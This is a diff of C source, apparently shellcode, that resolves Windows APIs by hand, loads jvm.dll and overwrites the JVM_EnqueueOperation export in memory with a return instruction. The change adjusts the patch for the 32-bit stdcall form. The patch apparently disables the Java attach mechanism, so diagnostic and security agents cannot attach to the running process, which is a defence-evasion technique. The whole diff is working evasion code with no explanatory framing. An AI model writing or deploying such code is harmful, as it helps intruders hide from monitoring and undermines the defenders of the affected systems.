@@ -10,7 +10,7 @@ TEXT_SEG char xy_LoadLibraryA[] = "LoadLibraryA";
 TEXT_SEG char xy_WriteProcessMemory[] = "WriteProcessMemory";
 TEXT_SEG char xy_VirtualProtectEx[] = "VirtualProtectEx";
 TEXT_SEG char xy_jvm[] = "jvm.dll";
-TEXT_SEG char xy_JVM_EnqueueOperation[] = "JVM_EnqueueOperation";
+TEXT_SEG char xy_JVM_EnqueueOperation[] = "_JVM_EnqueueOperation@20";
 
 int EntryMain() {
     HMODULE kernel32 = (HMODULE)getKernel32();
@@ -48,12 +48,12 @@ int EntryMain() {
         );
     FN_VirtualProtectEx fn_VirtualProtectEx = (FN_VirtualProtectEx)fn_GetProcAddress(kernel32, xy_VirtualProtectEx);
 
-    char retn[] = { '\xc3',0 };
+    char retn[] = { '\xc2', '\x14', '\x00', 0 };
     LPVOID dst = fn_GetProcAddress(fn_LoadLibraryA(xy_jvm), xy_JVM_EnqueueOperation);
     DWORD old;
-    if (fn_VirtualProtectEx((HANDLE)-1, dst, 1, PAGE_EXECUTE_READWRITE, &old)) {
-        fn_WriteProcessMemory((HANDLE)-1, dst, retn, 1, NULL);
-        fn_VirtualProtectEx((HANDLE)-1, dst, 1, old, &old);
+    if (fn_VirtualProtectEx((HANDLE)-1, dst, 3, PAGE_EXECUTE_READWRITE, &old)) {
+        fn_WriteProcessMemory((HANDLE)-1, dst, retn, 3, NULL);
+        fn_VirtualProtectEx((HANDLE)-1, dst, 3, old, &old);
     }
 
     return 0;
